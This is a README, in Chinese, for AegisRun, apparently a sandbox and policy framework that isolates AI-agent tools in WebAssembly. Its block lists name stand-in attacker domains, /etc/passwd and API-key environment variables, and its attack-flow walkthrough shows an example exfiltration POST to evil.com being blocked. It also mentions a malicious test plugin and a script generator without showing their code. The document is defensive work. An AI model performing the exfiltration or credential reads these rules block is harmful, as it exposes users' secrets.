# AegisRun v0.7.0

**AI Agent 安全工具执行框架 — MoonBit 策略引擎 + Rust 沙箱运行时**

[![MoonBit](https://img.shields.io/badge/MoonBit-0.1.20260608-blue)](https://moonbitlang.com)
[![Rust](https://img.shields.io/badge/Rust-wasmtime%2039-orange)](https://github.com/tuya-me/AegisRun/tree/clean-v2/runtime)
[![License](https://img.shields.io/badge/License-Apache--2.0-blue)](https://opensource.org/licenses/Apache-2.0)
[![OSC2026](https://img.shields.io/badge/OSC2026-AI%20Agent%20Track-orange)](https://moonbitlang.github.io/OSC2026/)

> MoonBit `>= 0.1.20260608` | Rust `>= 1.80`（仅 runtime 目录需要）| wasmtime 39
> 
> **安装**: `moon add tuya-me/aegisrun` &nbsp;|&nbsp; **当前分支**: `clean-v2`

---

## 项目简介

AegisRun 让 AI Agent 安全调用第三方工具。每个工具编译为 WebAssembly 模块，零权限启动，按需授权。

**两层架构**：

```
MoonBit 库 (src/lib/)               Rust 运行时 (runtime/)
┌────────────────────┐           ┌──────────────────────────┐
│ check_domain()     │   Allow   │ wasmtime WASI 拦截器      │
│ check_path()       │←─────────│ path_open → check_path    │
│ check_env()        │   Deny    │ environ_get → check_env   │
│                    │           │ sock_send → check_domain  │
│ 纯逻辑，纯 MoonBit  │           │ 系统调用拦截，Rust 实现    │
└────────────────────┘           └──────────────────────────┘
    策略判断层                         执行拦截层
```

---

## 快速开始

```cmd
cd D:\moonbit\aegisrun

# 新手一键菜单
quickstart.cmd

# MoonBit CLI：拦截演示 + 策略管理
moon run src/main

# Rust CLI：WASI 沙箱 + 审计 + Web 面板
cd runtime
cargo run -- demo
cargo run -- scan malware.py
cargo run -- serve
```

---

## 调用方式

### 作为库使用

```moonbit
// MoonBit: moon add tuya-me/aegisrun
let aegis = @lib.AegisRun::new("standard")
aegis.check_domain("evil.com")          // → Deny
aegis.check_path("/etc/passwd")          // → Deny
aegis.check_env("OPENAI_API_KEY")        // → Deny
```

```rust
// Rust: cargo add aegisrun-runtime
let policy = Policy::standard();
policy.check_domain("evil.com");  // → false
scan_script(&source);             // → 返回违规列表
```

### CLI 命令

| 命令 | 效果 |
|------|------|
| `moon run src/main` | MoonBit 策略引擎 + 拦截演示 |
| `cargo run -- demo` | Rust 策略引擎演示（14项） |
| `cargo run -- scan malware.py` | 扫描脚本找威胁 |
| `cargo run -- sandbox tool.wasm` | WASI 物理隔离沙箱 |
| `cargo run -- serve` | Web 管理面板（9090端口） |
| `cargo run -- audit` | 审计日志 JSONL 写盘 |
| `cargo run -- verify tool.wasm id pub` | 工具签名验证 |
| `cargo run -- policy show` | 查看当前策略 |

### WASI 物理隔离沙箱

```cmd
:: 编译恶意工具
cd runtime\tools\evil_plugin
cargo build --target wasm32-wasip1 --release

:: 沙箱执行——工具物理上无法访问任何文件/密钥
cargo run -- sandbox target\wasm32-wasip1\release\evil-plugin.wasm
```

输出：
```
[BLOCKED] /etc/passwd: os error 44 (sandbox — zero preopens)
[BLOCKED] OPENAI_API_KEY: not set (sandbox — filtered env)
[BLOCKED] GITHUB_TOKEN: not set (sandbox — filtered env)
27/27 malicious operations intercepted — 不是策略 Deny，是 WASI 物理隔离
```

### Web 管理面板

```cmd
cargo run -- serve                  # 启动 Web 面板
start dashboard.html                # 或双击打开
:: 浏览器 → http://localhost:9090
:: 网页改策略 → 点"复制CLI命令" → 粘贴到CMD → 同步到库
```

### 策略同步（环境变量）

Web 面板修改策略后导出为 `AEGISRUN_POLICY` 变量，引擎启动时自动加载：

```cmd
set AEGISRUN_POLICY=domain_bl=evil.com,stealer.cc|path_bl=/etc/passwd|domain_wl=wttr.in
moon run src/main
```

### MCP 集成

```json
// Claude Desktop 配置
{ "mcpServers": { "aegisrun": { "url": "http://localhost:9090/mcp" } } }
```

Agent 可调 5 个工具：sandbox / scan / check_domain / check_path / check_env

---

## 规则定制

AegisRun 的规则完全可配置，三种方式按需选用：

| 方式 | 路径 | 适合场景 |
|------|------|----------|
| 编辑 YAML 预设 | `presets/standard.yaml` | 项目启动时确定策略 |
| 命令行 | `moon run src/main deny domain xxx` | 快速临时封禁 |
| Web 面板 | `cargo run -- serve` → 浏览器操作 | 非开发人员使用 |

**接入外部数据源**：YAML 和 JSON 都是标准格式，可以把企业防火墙导出的 IP 列表、行业 ISAC 共享的黑名单、自建蜜罐捕获的攻击 IP 直接写入 `policy.json`，程序启动自动加载。

```yaml
# presets/standard.yaml — 扩展示例
blacklist:
  network:
    domains:
      - "evil.com"           # 内置
      - "phish.your-org.cn"  # 你们公司发现的钓鱼域名
      - "192.168.*"          # 内网
  env_vars:
    - "OPENAI_API_KEY"       # 内置
    - "INTERNAL_MASTER_KEY"  # 你们的内部密钥前缀
```

---

## 攻击拦截流程

以三类典型攻击为例，展示从调用到拦截的完整链路。

### 域名拦截（攻击 #1：evil.com 数据外泄）

```
1. 工具发起 HTTP 请求 → POST https://evil.com/collect
       │
2. sandbox.mbt::sandbox_http_request()
       提取域名 "evil.com"
       │
3. core.mbt::check_domain()
       ├─ HashMap.get("evil.com") → Some("known-malware-c2")
       └─ 返回 Deny
       │
4. aegisrun.mbt::check_domain()
       缓存结果 → total_blocks++
       │
5. 返回 "BLOCKED: domain 'evil.com' is blacklisted"
       HTTP 请求在 sandbox 层被拦截，包未发出
```

策略来源：`presets/standard.yaml` → `blacklist.network.domains` → 编译期嵌入 `core.mbt::load_standard_preset()`

### 路径拦截（攻击 #4：/etc/passwd 文件窃取）

```
1. 工具调用 open("/etc/passwd")
       │
2. sandbox.mbt::sandbox_file_open()     ← MoonBit 策略层
   runtime/lib.rs::sandbox_read_file()  ← Rust OS 拦截层
       │
3. check_path() → HashMap.exact_match("/etc/passwd") → Deny
       │
4. Rust 层 read_to_string() 未被调用
   WASI 层 path_open() 被 preopen 检查拒绝
```

策略来源：`presets/standard.yaml` → `blacklist.filesystem.paths` → 30+ 条精确路径 + 前缀目录

### 环境变量拦截（攻击 #7：OPENAI_API_KEY 窃取）

```
1. 工具调用 getenv("OPENAI_API_KEY")
       │
2. core.mbt::check_env()
       ├─ 遍历 sensitive_envs（36 条模式）
       │    "OPENAI_API_KEY" 精确命中
       └─ 返回 Deny
       │
3. Rust 层 std::env::var() 未被调用
   WASI 层 environ_get() 返回过滤后的安全变量列表
```

策略来源：`presets/standard.yaml` → `blacklist.env_vars` → 36 条 AI/云/数据库/CI 密钥模式

### 调用链速查

| 攻击类型 | 入口文件 | 策略文件 | 拦截函数 |
|----------|----------|----------|----------|
| 域名 | `sandbox.mbt:74` | `core.mbt:216` | `check_domain()` |
| 路径 | `sandbox.mbt` / `lib.rs:83` | `core.mbt:146` | `check_path()` |
| 环境变量 | `sandbox.mbt` / `lib.rs:91` | `core.mbt:172` | `check_env()` |
| DNS 劫持 | `dns_guard.mbt:77` | `dns_guard.mbt:29` | `check_ip()` |
| 风险评分 | `scorer.mbt:36` | 内置评分规则 | `score_manifest()` |

---

## 项目结构

```
aegisrun/
├── src/lib/                 MoonBit 核心库（10 个模块，~1440 行）
│   ├── aegisrun.mbt           统一门面（一行 API 接入）
│   ├── core.mbt               黑名单引擎 + 策略引擎
│   ├── sandbox.mbt            沙箱拦截层
│   ├── scorer.mbt             风险评分引擎
│   ├── sql_guard.mbt          SQL 资源控制
│   ├── limiter.mbt            三维并发限流
│   ├── monitor.mbt            压力监控 + 熔断
│   ├── dns_guard.mbt          DNS 劫持检测
│   ├── alert.mbt              告警通知
│   └── dashboard.mbt          终端仪表盘
│
├── runtime/                  Rust 库 + CLI（~900 行）
│   ├── src/lib.rs              核心库（Policy + sandbox + scanner）
│   ├── src/main.rs             CLI 工具（cargo run --）
│   ├── src/sandbox.rs          wasmtime WASI 物理隔离沙箱
│   ├── src/server.rs           Web 面板 + MCP 端点
│   ├── src/persist.rs          审计日志 + 策略持久化 + 热加载
│   ├── src/verify.rs           工具签名验证
│   └── tools/evil_plugin/     恶意 .wasm 测试工具（27/27 拦截验证）
│
├── src/demo/                 MoonBit 演示
├── src/generator/            恶意脚本生成器
├── dashboard.html            Web 管理面板
├── docs/                     公开文档
└── presets/                  安全预设（YAML）
```

---

## 安全架构（五层防御）

| 层 | 名称 | 实现 |
|:--:|------|------|
| 1 | 安装时声明审查 | 风险评分引擎（Safe/Warning/Dangerous/Critical） |
| 2 | 域名/IP 黑名单 | HashMap O(1) + 后缀通配 + IP 前缀 + 内网（45+规则） |
| 3 | 路径 + 环境变量保护 | 精确 + 前缀目录 + KEY/SECRET/TOKEN 检测（60+模式） |
| 4 | 工具黑名单 + 审计 | 即时封杀 + JSONL 持久化 + 策略热加载 |
| 5 | Wasm 沙箱物理隔离 | Rust wasmtime WASI 零目录预打开 + 过滤环境变量 |

---

## 相关文档

- [GUIDE.md](GUIDE.md) — 新手指南（3 分钟上手 + 常见坑）
- [CHANGELOG.md](CHANGELOG.md) — 更新日志（版本变更记录）
- [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) — 架构文档（完整调用链 + 数据结构）
- [docs/CONTRIBUTING.md](docs/CONTRIBUTING.md) — 开发者指南（贡献方向 + 代码规范）
- [docs/DOCUMENTATION-GUIDE.md](docs/DOCUMENTATION-GUIDE.md) — 文档规范
- [runtime/README.md](runtime/README.md) — Rust 运行时说明

---

## 开源许可

Apache License 2.0
